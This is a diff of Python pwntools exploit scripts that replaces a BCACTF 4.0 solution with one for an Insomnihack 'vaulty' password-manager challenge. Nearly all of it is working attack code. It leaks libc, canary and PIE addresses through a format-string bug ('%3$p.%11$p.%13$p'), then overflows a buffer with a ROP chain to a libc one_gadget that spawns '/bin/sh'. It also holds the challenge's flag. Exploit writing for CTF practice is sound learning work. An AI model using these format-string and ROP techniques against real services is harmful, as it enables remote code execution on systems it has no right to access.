@@ -1,74 +1,104 @@
 #!/usr/bin/env python3
 
-#===========================================================
-#                        BCACTF 4.0
-#===========================================================
-
 from pwn import *
 
-exe = context.binary = ELF('./roptiludrop.elf')
+elf = ELF("./vaulty", False)
+libc = ELF("./libc.so.6", False)
 
-host = args.HOST or '204.48.21.205'
-port = int(args.PORT or 30344)
-
-def start_local(argv=[], *a, **kw):
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-def start_remote(argv=[], *a, **kw):
-    io = connect(host, port)
-    if args.GDB:
-        gdb.attach(io, gdbscript=gdbscript)
-    return io
-
-def start(argv=[], *a, **kw):
-    if args.LOCAL:
-        return start_local(argv, *a, **kw)
-    else:
-        return start_remote(argv, *a, **kw)
-
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
-# Arch:     amd64-64-little
-# RELRO:    Full RELRO
-# Stack:    Canary found
-# NX:       NX enabled
-# PIE:      PIE enabled
+# sess = remote("vaulty.insomnihack.ch", 4556)
+sess = process(["./ld-linux.so.2", elf.path], env={"LD_PRELOAD":"./libc.so.6"})
+# sess = process(elf.path)
 
 
-io = start()
-libc = ELF("libc-2.31.so")
+class Pwner:
+	def __init__(self, session):
+		self.s = session
 
-io.sendline(b'%9$p')
-io.recvuntil(b'> ')
-canary = eval(io.recvuntil(b'What')[:-4])
 
-io.recvuntil(b'? ')
-printf_plt = eval(io.recvline(keepends=False))
-libc_base = printf_plt - libc.sym["printf"]
+	def leakAddresses(self):
+		# %3$p 	->	libc:	libc.address + 0x114697
+		# %11$p ->	canary
+		# %13$p ->	return: ELF_BASE + 0x1984
 
-# 0xe6c7e execve("/bin/sh", r15, r12)
-# constraints:
-#   [r15] == NULL || r15 == NULL
-#   [r12] == NULL || r12 == NULL
+		self.createEntry( username=b"%3$p.%11$p.%13$p" )
+		self.printEntry( 0 )
+		
+		# Username: 0x7fe05d200000.0x319aedbb24a52000.0x7fe05d627000\n
+		self.s.recvuntil(b'Username: ')
+		leaks = [int(addr, 16) for addr in self.s.recvline(False).decode().split(".")]
+		
+		libc.address = leaks[0] - 0x114697
+		self.canary = leaks[1]
+		elf.address = leaks[2] - 0x1984
 
-gadgets = ROP(libc)
-one_gadget = libc_base + 0xe6c7e
-pop_r12 = libc_base + gadgets.find_gadget(['pop r12', 'ret'])[0]
-pop_r15 = libc_base + gadgets.find_gadget(['pop r15', 'ret'])[0]
+		self.s.success(f"Libc's base is {hex(libc.address)}")
+		self.s.success(f"Elf's base is {hex(elf.address)}")
+		self.s.success(f"Canary is {hex(self.canary)}")
 
-payload = cyclic(24)                # trash
-payload += p64(canary)              # canary
-payload += p64(0xFace)              # rbp
-payload += p64(pop_r12)             # ROP: pop r12; ret;
-payload += p64(0x0)                 # ROP: 0x0
-payload += p64(pop_r15)             # ROP: pop r15; ret;
-payload += p64(0x0)                 # ROP: 0x0
-payload += p64(one_gadget)          # ROP: execve("/bin/sh", r15, r12)
-payload.ljust(0x50, b'\x00')
-io.sendline(payload)
 
-io.interactive()
+	def ropAttack(self):
+		# 0xebc88 execve("/bin/sh", rsi, rdx)
+		# constraints:
+		#   address rbp-0x78 is writable
+		#   [rsi] == NULL || rsi == NULL || rsi is a valid argv
+		#   [rdx] == NULL || rdx == NULL || rdx is a valid envp
+
+		ONE_GADGET = 	libc.address + 0xebc88
+		gRET = 			libc.address + 0x0000000000029139
+		gPOP_RDX_RET = 	libc.address + 0x00000000000796a2
+		gPOP_RSI_RET = 	libc.address + 0x000000000002be51
+
+		payload = flat(
+			b"a" * (32 + 8),			# offset
+			p64( self.canary ),			# canary
+			b"a" * 16,					# offset
+			p64( elf.bss(0x100) ),		# rbp
+			p64( gRET ) * 3,			# just in case
+			p64( gPOP_RDX_RET ),		# set rdx 0
+			p64( 0x0 ),
+			p64( gPOP_RSI_RET ),		# set rsi 0
+			p64( 0x0 ),
+			p64( ONE_GADGET ),			# execve("/bin/sh", rsi, rdx)
+		)
+
+		self.createEntry( url=payload )
+
+
+	def createEntry(self, username=b'test', password=b'test', url=b'test'):
+		self.s.recvuntil(b'Vault Menu:')
+		self.s.sendline(b'1')
+		for data in [username, password, url]:
+			self.s.sendline(data)
+
+
+	def modifyEntry(self, username=b'test', password=b'test', url=b'test'):
+		self.s.recvuntil(b'Vault Menu:')
+		self.s.sendline(b'2')
+		for data in [username, password, url]:
+			self.s.sendline(data)
+
+
+	def printEntry(self, id):
+		self.s.recvuntil(b'Vault Menu:')
+		self.s.sendline(b'4')
+		self.s.sendline( str(id).encode() )
+
+
+def main():
+
+	pwner = Pwner(sess)
+
+	pwner.s.info(f"Leaking addresses via the format-string vuln.....")
+	pwner.leakAddresses()
+
+	pwner.s.info(f"Getting the RCE via the ROP with the BoF.....")
+	pwner.ropAttack()
+
+	# gdb.attach(s)
+	pwner.s.interactive()
+
+
+# INS{An0Th3r_P4SSw0RD_m4nag3r_h4ck3d}
+
+if __name__=="__main__":
+	main()
